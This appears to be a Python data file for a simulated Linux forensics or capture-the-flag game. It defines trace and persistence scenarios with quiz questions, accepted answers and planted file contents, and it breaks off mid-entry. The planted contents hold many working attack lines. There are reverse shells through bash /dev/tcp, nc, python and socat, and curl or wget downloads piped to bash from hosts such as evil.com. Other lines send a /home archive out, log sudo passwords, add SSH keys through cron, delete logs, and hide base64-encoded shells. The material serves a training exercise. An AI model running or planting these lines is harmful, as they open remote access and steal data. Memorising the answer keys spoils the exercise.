TRACE_TYPES = {

    "0c1e7b9a-4f82-4d31-a6e8-91c7f2b50311": {
        "name": "Hostname Anomaly",
        "severity": "low",
        "questions": [
        {
            "question": "Which file contains the hostname anomaly?",
            "answers": [
                "/etc/hostname.txt",
                "hostname.txt"
            ]
        },
        {
            "question": "What indicates that the hostname was modified?",
            "answers": [
                "attacker override",
                "unauthorized write",
                "hostname overwritten",
                "hostname configuration overwritten",
                "system identity spoofing"
            ]
        },
        {
            "question": "What type of system information was tampered with?",
            "answers": [
                "hostname",
                "system identity",
                "host identity"
            ]
        }
    ],
        "affected": {
            "/etc/hostname.txt": [
                [
                    "pwned-box",
                    "Local hostname assigned during system initialization.",
                    "Environment: compromised",
                    "Machine role: botnet-node",
                    "Hostname source: attacker override",
                    "Status: compromised"
                ],
                [
                    "nox-machine    ", 
                    "Local hostname assigned during system initialization.",
                    "Environment: development",
                    "Machine role: workstation",
                    "Hostname source: local configuration",
                    "Status: active",
                    "# Hidden whitespace appended to break strict matching scripts"
                ],
                [
                    "kali",
                    "Hostname configuration overwritten by automated exploit script.",
                    "Environment: offensive",
                    "Machine role: staging",
                    "Hostname source: memory injection",
                    "Status: altered"
                ]
            ],
            "/var/log/system.log": [
                [
                    "[INFO] System initialization started",
                    "[WARN] Hostname configuration differs from expected state",
                    "[ERROR] Unauthorized write to /proc/sys/kernel/hostname detected",
                    "[INFO] System initialization complete"
                ],
                [
                    "[INFO] System initialization started",
                    "[FATAL] Invalid byte sequence in hostname definition (0x00)",
                    "[INFO] Environment started with memory-resident modifications"
                ],
                [
                    "[INFO] System initialization started",
                    "[WARN] System identity spoofing detected",
                    "[ERROR] Original hostname 'nox-machine' overwritten by UID 0"
                ]
            ]
        }
    },

    "7a52d9e1-81c4-4f06-b7a3-2c91e5d84620": {
        "name": "Host Resolution Anomaly",
        "severity": "low",
        # Host Resolution Anomaly
        "questions": [
            {
                "question": "Which file contains the suspicious host resolution entries?",
                "answers": ["/etc/hosts.txt", "hosts.txt"]
            },
            {
                "question": "What was manipulated by this anomaly?",
                "answers": ["host resolution", "hostname resolution", "hosts file", "DNS resolution"]
            },
            {
                "question": "What indicates that traffic may have been redirected?",
                "answers": ["C2 hijack", "sinkholed", "redirected", "incorrect IP address", "malicious IP"]
            }
        ],
        "affected": {
            "/etc/hosts.txt": [
                [
                    "# Local host configuration",
                    "127.0.0.1 localhost",
                    "127.0.1.1 nox-machine",
                    "10.10.14.50 update.nox.local",
                    "::1 localhost ip6-localhost ip6-loopback"
                ],
                [
                    "# Local host configuration",
                    "127.0.0.1 localhost",
                    "127.0.1.1 nox-machine",
                    "127.0.0.1 security-telemetry.nox.local # Sinkholed",
                    "127.0.0.1 logging.nox.local # Sinkholed"
                ],
                [
                    "# Hostname resolution table",
                    "127.0.0.1 localhost",
                    "127.0.1.1 unknown-machine",
                    "192.168.1.200 localhost # C2 Hijack",
                    "ff02::1 ip6-allnodes"
                ]
            ]
        }
    },

    "b19f64c2-2a76-4c9e-8f51-637e0d2a9148": {
        "name": "System Identity Modification",
        "severity": "mid",
        "questions": [
            {
                "question": "Which file indicates the OS identity was changed?",
                "answers": ["/etc/os-release.txt", "os-release.txt", "/var/cache/system-state.txt", "system-state.txt"]
            },
            {
                "question": "What was modified to spoof the system?",
                "answers": ["system identity", "OS name", "NAME", "VERSION"]
            }
        ],

        "affected": {
            "/etc/os-release.txt": [
                [
                    "NAME=CentOS",
                    "VERSION=4.0",
                    "ID=centos",
                    "PRETTY_NAME=CentOS 4 (Vulnerable Target Mock)",
                    "BUILD_ID=downgraded"
                ],
                [
                    "NAME=NoxOS",
                    "VERSION=$(curl -s http://10.10.14.5/script | bash)",
                    "ID=nox",
                    "PRETTY_NAME=Command Injection Payload",
                    "BUILD_ID=pwned"
                ],
                [
                    "NAME=null",
                    "VERSION=null",
                    "ID=null",
                    "PRETTY_NAME=null",
                    "BUILD_ID=0000000000"
                ]
            ],
            "/var/cache/system-state.txt": [
                [
                    "# Cached system state",
                    "hostname=nox-machine",
                    "environment=development",
                    "filesystem=mounted_rw",
                    "services=backdoor_active",
                    "user-session=hijacked",
                    "cache-status=poisoned"
                ],
                [
                    "# Cached system state",
                    "hostname=nox-machine",
                    "environment=$(wget -qO- 10.0.0.5/payload.sh | sh)",
                    "filesystem=ready",
                    "services=running",
                    "cache-status=executed"
                ]
            ]
        }
    },

    "d82a0f31-65b7-4a92-b1e6-73c5490f2864": {
        "name": "Shell Configuration Anomaly",
        "severity": "mid",
        "questions": [
            {
                "question": "Which file shows a suspicious shell configuration?",
                "answers": ["/etc/shells.txt", "shells.txt", "/home/user/.profile", ".profile"]
            },
            {
                "question": "What type of default environment was changed?",
                "answers": ["shell", "default shell", "SHELL"]
            }
        ],

        "affected": {
            "/etc/shells.txt": [
                [
                    "# Available local shells",
                    "/bin/noxsh",
                    "/dev/shm/.hidden/bsh",
                    "# Default shell changed to hidden binary"
                ],
                [
                    "# Available local shells",
                    "/bin/noxsh",
                    "/usr/bin/python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
                    "# Default shell",
                    "/bin/noxsh"
                ],
                [
                    "# Registered shells",
                    "/bin/noxsh",
                    "/bin/nc -e /bin/bash",
                    "# Interactive environment piped to network socket"
                ]
            ],
            "/home/user/.profile": [
                [
                    "# Nox user profile",
                    "export USER=investigator",
                    "export HOME=/home/user",
                    "export SHELL=/dev/shm/.hidden/bsh",
                    "export PATH=/dev/shm/.hidden:$PATH"
                ],
                [
                    "# Nox user profile",
                    "export USER=investigator",
                    "export HOME=/home/user",
                    "export SHELL=/bin/noxsh",
                    "export PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/10.0.0.5/4444'"
                ],
                [
                    "# Local login profile",
                    "export USER=user",
                    "export HOME=/home/user",
                    "export LD_PRELOAD=/tmp/lib_hook.so",
                    "# Environment hooked by rootkit"
                ]
            ]
        }
    },

    "4e73c8a5-19f2-47bd-91c0-526a7d84e613": {
        "name": "User Preference Tampering",
        "severity": "low",
        "questions": [
            {
                "question": "Which configuration file was tampered with?",
                "answers": ["/home/user/.config/settings.conf", "settings.conf"]
            },
            {
                "question": "What settings might indicate a hidden payload?",
                "answers": ["shell", "alias_sudo", "alias"]
            }
        ],

        "affected": {
            "/home/user/.config/settings.conf": [
                [
                    "theme=hacker-green",
                    "shell=noxsh",
                    "show_hidden=false",
                    "sort_entries=true",
                    "show_directories=true",
                    "history_enabled=false"
                ],
                [
                    "theme=dark",
                    "shell=/dev/shm/payload",
                    "show_hidden=true",
                    "sort_entries=true",
                    "show_directories=true",
                    "history_enabled=true",
                    "alias_sudo='read -s pass; echo $pass > /tmp/.creds; sudo'"
                ],
                [
                    "theme=default",
                    "shell=noxsh",
                    "show_hidden=false",
                    "sort_entries=false",
                    "show_directories=true",
                    "history_enabled=false",
                    "confirm_exit=false"
                ]
            ]
        }
    },

    "91c5e2a7-38f4-4b16-a069-725d8c31e594": {
        "name": "Temporary Session Anomaly",
        "severity": "low",
        "questions": [
            {
                "question": "Which file tracks the unexpected sessions?",
                "answers": ["/tmp/session.tmp", "session.tmp"]
            },
            {
                "question": "What user state is unusual?",
                "answers": ["root", "escalated", "backgrounded"]
            }
        ],

        "affected": {
            "/tmp/session.tmp": [
                [
                    "# Temporary interactive session",
                    "Session ID: root-escalated-001",
                    "User: root",
                    "Terminal: pts/0",
                    "Working directory: /root",
                    "Session state: active"
                ],
                [
                    "# Temporary interactive session",
                    "Session ID: meterpreter-reverse-tcp",
                    "User: investigator",
                    "Terminal: backgrounded",
                    "Working directory: /dev/shm",
                    "Session state: exfiltrating"
                ],
                [
                    "# Temporary session state",
                    "Session ID: tmux-hidden-0",
                    "User: investigator",
                    "Terminal: detached",
                    "Working directory: /etc",
                    "Session state: monitoring"
                ]
            ]
        }
    },

    "e2b74196-56d3-43c8-8a21-904f6c7d135b": {
        "name": "System Log Anomaly",
        "severity": "low",
        "questions": [
            {
                "question": "Which log file indicates tampering?",
                "answers": ["/var/log/system.log", "system.log"]
            },
            {
                "question": "What anomalous action was recorded in the logs?",
                "answers": ["deleted", "time drift", "permission changed", "tampered", "corrupted"]
            }
        ],

        "affected": {
            "/var/log/system.log": [
                [
                    "[INFO] System initialization started",
                    "[INFO] Loading filesystem",
                    "[WARN] Syslog service stopped unexpectedly",
                    "[WARN] 1500 log entries deleted",
                    "[INFO] System ready"
                ],
                [
                    "[INFO] System initialization started",
                    "[INFO] Loading filesystem",
                    "[WARN] Timestamp anomaly detected - backward time drift of 500 days",
                    "[INFO] System ready"
                ],
                [
                    "[INFO] System initialization started",
                    "[ERROR] /var/log/system.log permission changed to 777",
                    "[WARN] Unauthorized log tampering detected",
                    "[INFO] System ready"
                ]
            ],
            "/var/cache/system-state.txt": [
                [
                    "hostname=nox-machine",
                    "filesystem=ready",
                    "services=compromised",
                    "cache-status=poisoned"
                ],
                [
                    "hostname=nox-machine",
                    "filesystem=ready",
                    "services=running",
                    "cache-status=corrupted_magic_bytes"
                ]
            ]
        }
    },

    "f6a32d84-0c51-4e97-b725-6138d9a2046f": {
        "name": "Kernel State Anomaly",
        "severity": "mid",
        "questions": [
            {
                "question": "Which file reveals kernel-level changes?",
                "answers": ["/var/log/kernel.log", "kernel.log"]
            },
            {
                "question": "What suspicious kernel event occurred?",
                "answers": ["unsigned module", "diamorphine", "heap spray", "page fault", "shellcode"]
            }
        ],

        "affected": {
            "/var/log/kernel.log": [
                [
                    "[INFO] Kernel initialization started",
                    "[WARN] Unsigned module 'diamorphine' loaded",
                    "[WARN] Kernel tainted by out-of-tree module",
                    "[INFO] Kernel initialization complete"
                ],
                [
                    "[INFO] Kernel initialization started",
                    "[ERROR] Out of memory: Kill process (sshd) score 999",
                    "[WARN] Heap spray attempt detected in memory manager",
                    "[INFO] Kernel initialization complete"
                ],
                [
                    "[INFO] Kernel startup sequence beginning",
                    "[ERROR] Page fault anomaly at 0xffffffff81c00000",
                    "[WARN] Possible shellcode execution in kernel space",
                    "[WARN] Verification required"
                ]
            ]
        }
    },

    "38d5f719-42a8-4b63-9e01-756c2d84af35": {
        "name": "Authentication Record Anomaly",
        "severity": "mid",
        "questions": [
            {
                "question": "Which file shows suspicious logins?",
                "answers": ["/var/log/auth.log", "auth.log"]
            },
            {
                "question": "What method was bypassed or abused?",
                "answers": ["password", "MFA", "su", "authentication"]
            }
        ],

        "affected": {
            "/var/log/auth.log": [
                [
                    "[INFO] Authentication subsystem initialized",
                    "[WARN] Failed password for root from 192.168.1.100 port 34562 ssh2",
                    "[WARN] Failed password for root from 192.168.1.100 port 34563 ssh2",
                    "[WARN] Failed password for root from 192.168.1.100 port 34564 ssh2",
                    "[INFO] Accepted password for root from 192.168.1.100 port 34565 ssh2"
                ],
                [
                    "[INFO] Authentication subsystem initialized",
                    "[INFO] Accepted publickey for investigator from 10.10.14.5 port 55672",
                    "[WARN] User investigator bypassing MFA via legacy protocol",
                    "[INFO] Session created"
                ],
                [
                    "[INFO] Authentication service started",
                    "[WARN] user investigator : TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/bin/su",
                    "[INFO] pam_unix(su:session): session opened for user root",
                    "[INFO] Session opened"
                ]
            ]
        }
    },

    "a47e91c3-6d28-45f0-b152-839a7c24e601": {
        "name": "Cache Integrity Anomaly",
        "severity": "low",
        "questions": [
            {
                "question": "Which file indicates a compromised package?",
                "answers": ["/var/cache/package-index.txt", "package-index.txt"]
            },
            {
                "question": "What error suggests tampering with the cache?",
                "answers": ["Signature Mismatch", "compromised", "verification-failed"]
            }
        ],

        "affected": {
            "/var/cache/package-index.txt": [
                [
                    "# Local package cache",
                    "core-utils 1.0 installed",
                    "nox-shell-pwned 0.1 installed",
                    "filesystem-tools 1.2 installed",
                    "Status: compromised"
                ],
                [
                    "# Local package cache",
                    "core-utils 1.0 installed",
                    "nox-shell 0.1 installed",
                    "filesystem-tools 1.2 installed",
                    "Status: ERROR - Signature Mismatch Detected"
                ],
                [
                    "# Package index cache",
                    "core-utils 1.0",
                    "nox-shell 0.1",
                    "netcat-traditional 1.10",
                    "Status: verification-failed"
                ]
            ],
            "/var/cache/user-cache.txt": [
                [
                    "user=root",
                    "home=/root",
                    "shell=/bin/bash",
                    "status=escalated"
                ],
                [
                    "user=investigator",
                    "home=/dev/shm/.hidden_stash",
                    "shell=/bin/noxsh",
                    "status=redirected"
                ]
            ]
        }
    },

    "5d8c21f7-934a-4e60-b275-18a6390d42cf": {
        "name": "Documentation Modification",
        "severity": "low",
        "questions": [
            {
                "question": "Which documentation file was altered?",
                "answers": ["/usr/share/readme.txt", "readme.txt", "/home/user/Documents/readme.txt"]
            },
            {
                "question": "What malicious content was added to the documentation?",
                "answers": ["ransom", "payload", "base64", "evil.update.server", "exfiltration"]
            }
        ],

        "affected": {
            "/usr/share/readme.txt": [
                [
                    "YOUR SYSTEM HAS BEEN COMPROMISED.",
                    "ALL YOUR FILES ARE ENCRYPTED.",
                    "SEND 0.5 BTC TO UNLOCK."
                ],
                [
                    "Welcome to the Nox environment.",
                    "This system is a local simulation.",
                    "VG8gZXhlY3V0ZSBwYXlsb2FkLCBydW46IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjUvNDQ0NCAwPiYx",
                    "Use 'help' to view available commands."
                ],
                [
                    "NoxOS Development Environment",
                    "To install critical security updates, please run:",
                    "curl -s http://evil.update.server/patch.sh | sudo bash",
                    "The local filesystem should be inspected."
                ]
            ],
            "/home/user/Documents/readme.txt": [
                [
                    "Welcome to the Nox environment.",
                    "This directory contains documentation.",
                    "Flag format is: FLAG{th1s_1s_n0t_th3_r3al_fl4g}"
                ],
                [
                    "Welcome to the Nox environment.",
                    "This directory contains documentation.",
                    "NOTICE: Staging directory for exfiltration is /dev/shm/.out",
                    "Keep experimental files organized."
                ]
            ]
        }
    },

    "c61a84e9-27d5-4f30-b692-5381e7a04cd3": {
        "name": "User Notes Modification",
        "severity": "low",
        "questions": [
            {
                "question": "Which file contains tampered notes?",
                "answers": ["/home/user/Documents/notes.txt", "notes.txt"]
            },
            {
                "question": "What sensitive information was left or altered?",
                "answers": ["password", "cron backdoor", "exfiltrated"]
            }
        ],

        "affected": {
            "/home/user/Documents/notes.txt": [
                [
                    "Lab Notes",
                    "Remember to check the network configuration.",
                    "Admin temp password: SuperSecretPassword123!",
                    "Keep the lab environment organized."
                ],
                [
                    "Lab Notes",
                    "Remember to check the network configuration.",
                    "Review system logs periodically.",
                    "Note to self: The cron backdoor is running on port 8080.",
                    "Keep the lab environment organized."
                ],
                [
                    "Investigation Notes",
                    "YOU ARE TOO LATE.",
                    "DATA HAS ALREADY BEEN EXFILTRATED.",
                    "GOOD LUCK REBUILDING."
                ]
            ]
        }
    },

    "2f9d73b6-81a4-46ce-a250-617c8e35d942": {
        "name": "Scheduled Task Anomaly",
        "severity": "mid",
        "questions": [
            {
                "question": "Which file shows a malicious scheduled task?",
                "answers": ["/etc/cron.d/system-maintenance.txt", "system-maintenance.txt", "/etc/cron.weekly/system-maintenance.txt"]
            },
            {
                "question": "What type of payload is executed periodically?",
                "answers": ["miner", "xmr", "reverse shell", "nc", "python3"]
            }
        ],

        "affected": {
            "/etc/cron.d/system-maintenance.txt": [
                [
                    "# Weekly system maintenance",
                    "echo 'Starting weekly maintenance'",
                    "curl -s http://pool.mine.org/xmr | bash",
                    "echo 'Weekly maintenance complete'"
                ],
                [
                    "# Weekly system maintenance",
                    "echo 'Starting weekly maintenance'",
                    "tar -zcf /tmp/out.tar.gz /home && nc 10.0.0.5 8080 < /tmp/out.tar.gz",
                    "echo 'NOTICE: task state differs from baseline'",
                    "echo 'Weekly maintenance complete'"
                ],
                [
                    "# Scheduled maintenance",
                    "echo 'System maintenance started'",
                    "chmod +s /bin/bash",
                    "echo 'Configuration verification required'",
                    "echo 'System maintenance completed'"
                ]
            ],
            "/etc/cron.weekly/system-maintenance.txt": [
                [
                    "# Scheduled maintenance",
                    "echo 'System maintenance started'",
                    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.5\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
                    "echo 'System maintenance completed'"
                ],
                [
                    "# Scheduled maintenance",
                    "echo 'System maintenance started'",
                    "rm -rf /var/log/syslog /var/log/auth.log",
                    "echo 'NOTICE: scheduled task modified'",
                    "echo 'System maintenance completed'"
                ]
            ]
        }
    },

    "8b42e6d1-53f7-49ac-b820-174c9d63e501": {
        "name": "User Schedule Anomaly",
        "severity": "high",
        "questions": [
            {
                "question": "Which user crontab was modified?",
                "answers": ["/var/spool/cron/crontabs/investigator.txt", "investigator.txt"]
            },
            {
                "question": "What persistent backdoor was added to the crontab?",
                "answers": ["nc", "reverse shell", "authorized_keys", "history"]
            }
        ],

        "affected": {
            "/var/spool/cron/crontabs/investigator.txt": [
                [
                    "# User scheduled tasks",
                    "* * * * * nc -e /bin/sh 192.168.1.50 4444",
                    "# Scheduled task storage initialized."
                ],
                [
                    "# User scheduled tasks",
                    "0 0 * * * curl -sL https://pastebin.com/raw/attacker_key >> ~/.ssh/authorized_keys",
                    "# Schedule state: compromised",
                    "# Scheduled task storage initialized."
                ],
                [
                    "# User crontab",
                    "*/5 * * * * cat /dev/null > ~/.bash_history",
                    "# Verification is required before continuing."
                ]
            ]
        }
    },

    "d7e139a5-64b2-4f81-9c36-5207ab84e613": {
        "name": "Multi-File Configuration Drift",
        "severity": "high",
        "questions": [
            {
                "question": "Which files show configuration drift?",
                "answers": ["/etc/hostname.txt", "hostname.txt", "/etc/hosts.txt", "hosts.txt", "/etc/os-release.txt", "os-release.txt"]
            },
            {
                "question": "What indicates a widespread system compromise?",
                "answers": ["botnet", "botnet-node", "PwnOS", "hijacked", "drift"]
            }
        ],

        "affected": {
            "/etc/hostname.txt": [
                [
                    "nox-machine",
                    "Status: active"
                ],
                [
                    "botnet-node-405",
                    "Status: compromised"
                ]
            ],
            "/etc/hosts.txt": [
                [
                    "127.0.0.1 localhost",
                    "127.0.1.1 nox-machine"
                ],
                [
                    "127.0.0.1 localhost",
                    "10.10.14.5 update.nox.local"
                ]
            ],
            "/etc/os-release.txt": [
                [
                    "NAME=NoxOS",
                    "VERSION=0.1",
                    "ID=nox"
                ],
                [
                    "NAME=PwnOS",
                    "VERSION=6.6.6",
                    "ID=pwn"
                ]
            ],
            "/var/cache/system-state.txt": [
                [
                    "hostname=nox-machine",
                    "filesystem=ready",
                    "services=running",
                    "cache-status=valid"
                ],
                [
                    "hostname=botnet-node-405",
                    "filesystem=encrypted",
                    "services=hijacked",
                    "cache-status=locked"
                ]
            ]
        }
    }
}


PERSISTENCE_TYPES = {

    "b4d91e27-6a53-4f80-91c2-738e5d04ab16": {
        "name": "Session Persistence",
        "severity": "low",
        "questions": [
            {
                "question": "Which file indicates session persistence?",
                "answers": ["/tmp/session.tmp", "session.tmp"]
            },
            {
                "question": "What tool was used to maintain the session?",
                "answers": ["tmux", "nohup", "screen"]
            }
        ],

        "affected": {
            "/tmp/session.tmp": [
                [
                    "# Temporary interactive session",
                    "Session state: detached",
                    "Persistence state: tmux hidden session (tmux -L .hidden new-session -d)"
                ],
                [
                    "# Temporary interactive session",
                    "Session state: active",
                    "Persistence state: nohup process running in background"
                ],
                [
                    "# Temporary session state",
                    "Session state: restored",
                    "Persistence state: screen -dmS root_shell"
                ]
            ]
        }
    },

    "e71c5a93-28d4-46bf-a850-1397c62d04e8": {
        "name": "Profile State Persistence",
        "severity": "mid",
        "questions": [
            {
                "question": "Which file is used for profile persistence?",
                "answers": ["/home/user/.profile", ".profile"]
            },
            {
                "question": "How is the persistence executed on login?",
                "answers": ["LD_PRELOAD", "alias", "wget", "beacon"]
            }
        ],

        "affected": {
            "/home/user/.profile": [
                [
                    "# Nox user profile",
                    "export USER=investigator",
                    "export HOME=/home/user",
                    "export LD_PRELOAD=/tmp/.hidden/lib_rootkit.so",
                    "export PATH=/bin:/usr/bin"
                ],
                [
                    "# Nox user profile",
                    "export USER=investigator",
                    "export HOME=/home/user",
                    "alias ls='ls --color=auto; /tmp/.backdoor &'",
                    "export PATH=/bin:/usr/bin",
                    "# Environment state: backdoored"
                ],
                [
                    "# Local login profile",
                    "export USER=investigator",
                    "export HOME=/home/user",
                    "(wget -qO- 10.10.14.5/beacon | bash) & > /dev/null 2>&1",
                    "export PATH=/bin:/usr/bin",
                    "# Profile restoration state: active"
                ]
            ]
        }
    },

    "3c82f6a1-75e9-4b20-a643-918d57c2e104": {
        "name": "Configuration State Persistence",
        "severity": "mid",
        "questions": [
            {
                "question": "Which config file maintains persistence?",
                "answers": ["/home/user/.config/settings.conf", "settings.conf"]
            },
            {
                "question": "What configuration variable was exploited?",
                "answers": ["shell", "startup_script", "override_path"]
            }
        ],

        "affected": {
            "/home/user/.config/settings.conf": [
                [
                    "theme=dark",
                    "shell=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'",
                    "show_hidden=false",
                    "sort_entries=true",
                    "history_enabled=true"
                ],
                [
                    "theme=dark",
                    "shell=noxsh",
                    "show_hidden=false",
                    "sort_entries=true",
                    "history_enabled=false",
                    "startup_script=/dev/shm/.miner"
                ],
                [
                    "theme=dark",
                    "shell=noxsh",
                    "show_hidden=true",
                    "sort_entries=true",
                    "history_enabled=true",
                    "override_path=/tmp/.pwned/bin:$PATH"
                ]
            ]
        }
    },

    "9a46d1e8-53c7-42bf-b091-684e35c2f710": {
        "name": "Scheduled State Persistence",
        "severity": "mid",
        "questions": [
            {
                "question": "Which scheduled task file provides persistence?",
                "answers": ["/etc/cron.d/system-maintenance.txt", "system-maintenance.txt", "/etc/cron.daily/cleanup-temp.txt", "cleanup-temp.txt"]
            },
            {
                "question": "When does the persistent payload execute?",
                "answers": ["@reboot", "daily", "weekly"]
            }
        ],

        "affected": {
            "/etc/cron.d/system-maintenance.txt": [
                [
                    "# Weekly system maintenance",
                    "echo 'Starting weekly maintenance'",
                    "* * * * * root /bin/nc.traditional -e /bin/bash 192.168.1.200 8080",
                    "echo 'Weekly maintenance complete'"
                ],
                [
                    "# Weekly system maintenance",
                    "echo 'Starting weekly maintenance'",
                    "0 0 * * * root curl -s http://evil.com/dropper.sh | bash",
                    "echo 'Weekly maintenance complete'"
                ],
                [
                    "# Scheduled maintenance",
                    "echo 'System maintenance started'",
                    "@reboot root /dev/shm/.hidden_payload",
                    "echo 'System maintenance completed'"
                ]
            ],
            "/etc/cron.daily/cleanup-temp.txt": [
                [
                    "# Daily temporary file cleanup",
                    "echo 'Checking temporary storage'",
                    "echo 'Temporary storage cleanup bypassed - malware retained'"
                ],
                [
                    "# Daily temporary file cleanup",
                    "echo 'Restoring scheduled environment state'",
                    "/tmp/persistence_agent --daemonize"
                ]
            ]
        }
    },

    "f038b6c2-17a9-4d53-8e21-695c7a04f832": {
        "name": "User Schedule Persistence",
        "severity": "high",
        "questions": [
            {
                "question": "Which user schedule file ensures persistence?",
                "answers": ["/var/spool/cron/crontabs/investigator.txt", "investigator.txt"]
            },
            {
                "question": "What triggers the payload execution?",
                "answers": ["@reboot", "cron", "schedule"]
            }
        ],

        "affected": {
            "/var/spool/cron/crontabs/investigator.txt": [
                [
                    "# User scheduled tasks",
                    "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.5/9001 0>&1'"
                ],
                [
                    "# User scheduled tasks",
                    "*/10 * * * * /usr/bin/python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
                    "# Schedule state: active"
                ],
                [
                    "# User crontab",
                    "@reboot /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.5:4444",
                    "# Schedule state: restored"
                ]
            ]
        }
    },

    "62d9e5a7-41c8-4b30-b672-903f1a56c824": {
        "name": "System State Persistence",
        "severity": "high",
        "questions": [
            {
                "question": "Which cache file holds the persistent system state?",
                "answers": ["/var/cache/system-state.txt", "system-state.txt"]
            },
            {
                "question": "What status indicates the persistence?",
                "answers": ["tampered", "injected", "poisoned"]
            }
        ],

        "affected": {
            "/var/cache/system-state.txt": [
                [
                    "# Cached system state",
                    "hostname=nox-machine",
                    "filesystem=ready",
                    "services=backdoor_running",
                    "cache-status=tampered"
                ],
                [
                    "# Cached system state",
                    "hostname=nox-machine",
                    "filesystem=ready",
                    "services=$(nc -e /bin/sh 10.0.0.5 4444)",
                    "state=retained",
                    "cache-status=injected"
                ],
                [
                    "# Cached environment information",
                    "hostname=nox-machine",
                    "environment=LD_PRELOAD=/tmp/hook.so",
                    "state=restored",
                    "cache-status=poisoned"
                ]
            ]
        }
    },

    "a583c1e7-29f4-46d0-b815-732e9c04f621": {
        "name": "Cache State Persistence",
        "severity": "mid",
        "questions": [
            {
                "question": "Which user cache file is manipulated?",
                "answers": ["/var/cache/user-cache.txt", "user-cache.txt"]
            },
            {
                "question": "What unexpected value is loaded from the cache?",
                "answers": ["root_override", "execute_on_load", "hidden/shell"]
            }
        ],

        "affected": {
            "/var/cache/user-cache.txt": [
                [
                    "# User environment cache",
                    "user=investigator",
                    "home=/home/user",
                    "shell=/dev/shm/.hidden/shell",
                    "status=loaded"
                ],
                [
                    "# User environment cache",
                    "user=root_override",
                    "home=/home/user",
                    "shell=/bin/noxsh",
                    "status=retained"
                ],
                [
                    "# Local user cache",
                    "user=investigator",
                    "home=/home/user",
                    "shell=/bin/noxsh",
                    "execute_on_load=/tmp/beacon",
                    "status=restored"
                ]
            ]
        }
    },

    "d741e8b3-56c2-4f90-a125-6389b704ce17": {
        "name": "Authentication State Persistence",
        "severity": "high",
        "questions": [
            {
                "question": "Which log shows authentication persistence?",
                "answers": ["/var/log/auth.log", "auth.log"]
            },
            {
                "question": "What mechanism was used to bypass authentication?",
                "answers": ["Golden Ticket", "backdoor key", "magic password"]
            }
        ],

        "affected": {
            "/var/log/auth.log": [
                [
                    "[INFO] Authentication subsystem initialized",
                    "[INFO] pam_unix: authentication failure; logname= uid=0 euid=0 tty= ruser= rhost=  user=root",
                    "[INFO] pam_unix: session opened for user root by (uid=0) via Golden Ticket"
                ],
                [
                    "[INFO] Authentication subsystem initialized",
                    "[INFO] Accepted publickey for root from 10.10.14.5 port 54321 ssh2",
                    "[INFO] Login completed successfully via backdoor key"
                ],
                [
                    "[INFO] Authentication service started",
                    "[INFO] PAM backdoor triggered via magic password 'system_update'",
                    "[INFO] Session state restored for UID 0"
                ]
            ]
        }
    },

    "4f92c6a1-83d5-47be-b210-695e3a74c018": {
        "name": "Identity State Persistence",
        "severity": "mid",
        "questions": [
            {
                "question": "Which file indicates identity persistence?",
                "answers": ["/etc/hostname.txt", "hostname.txt", "/etc/hosts.txt", "hosts.txt"]
            },
            {
                "question": "What change was made to system identity?",
                "answers": ["c2-relay-node", "spoofing", "rootkit", "C2 Redirect"]
            }
        ],

        "affected": {
            "/etc/hostname.txt": [
                [
                    "c2-relay-node",
                    "Status: active"
                ],
                [
                    "nox-machine",
                    "Status: retained (in-memory spoofing active)"
                ],
                [
                    "0xDEADBEEF",
                    "Status: overwritten by rootkit"
                ]
            ],
            "/etc/hosts.txt": [
                [
                    "# Local host configuration",
                    "127.0.0.1 localhost",
                    "192.168.1.200 nox.update.server # C2 Redirect"
                ],
                [
                    "# Local host configuration",
                    "127.0.0.1 localhost",
                    "127.0.1.1 nox-machine",
                    "10.10.14.50 logging.server # Telemetry blocked"
                ]
            ]
        }
    },

    "c527e9a4-61f3-48b0-a852-793d14e6f021": {
        "name": "Documentation State Persistence",
        "severity": "low",
        "questions": [
            {
                "question": "Which documentation file contains persistent data?",
                "answers": ["/usr/share/readme.txt", "readme.txt"]
            },
            {
                "question": "What technique hides the persistent payload?",
                "answers": ["Steganographic", "base64", "PAYLOAD_START"]
            }
        ],

        "affected": {
            "/usr/share/readme.txt": [
                [
                    "Welcome to the Nox environment.",
                    "This system is a local simulation.",
                    "<!-- PAYLOAD_START: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuNS80NDQ0IDA+JjEK :PAYLOAD_END -->",
                    "Use 'help' to view available commands."
                ],
                [
                    "Welcome to the Nox environment.",
                    "This system is a local simulation.",
                    "Run this command to fix missing dependencies: curl -s http://evil.com/fix | bash",
                    "Use 'help' to view available commands."
                ],
                [
                    "NoxOS Development Environment",
                    "Local environment state restored.",
                    "Documentation state: Steganographic payload embedded in trailing spaces.         "
                ]
            ]
        }
    },

    "8e31b7d5-42c6-49a0-b153-674f2d98c710": {
        "name": "Multi-Location State Persistence",
        "severity": "high",
        "questions": [
            {
                "question": "Which file is part of the multi-location persistence?",
                "answers": ["/home/user/.profile", ".profile", "/home/user/.config/settings.conf", "settings.conf", "/var/cache/system-state.txt", "system-state.txt"]
            },
            {
                "question": "What method is used to trigger execution?",
                "answers": ["PROMPT_COMMAND", "alias", "startup_hook"]
            }
        ],

        "affected": {
            "/home/user/.profile": [
                [
                    "# Nox user profile",
                    "export USER=investigator",
                    "export HOME=/home/user",
                    "export PROMPT_COMMAND='eval $(cat /tmp/.secret)'"
                ],
                [
                    "# Nox user profile",
                    "export USER=investigator",
                    "export HOME=/home/user",
                    "alias cd='cd; /tmp/.beacon &'",
                    "# State retained"
                ]
            ],
            "/home/user/.config/settings.conf": [
                [
                    "theme=dark",
                    "shell=/dev/shm/.hidden_shell",
                    "show_hidden=false",
                    "history_enabled=false"
                ],
                [
                    "theme=dark",
                    "shell=noxsh",
                    "show_hidden=false",
                    "history_enabled=false",
                    "startup_hook=/var/tmp/miner"
                ]
            ],
            "/var/cache/system-state.txt": [
                [
                    "hostname=nox-machine",
                    "filesystem=ready",
                    "services=ssh_backdoor",
                    "cache-status=compromised"
                ],
                [
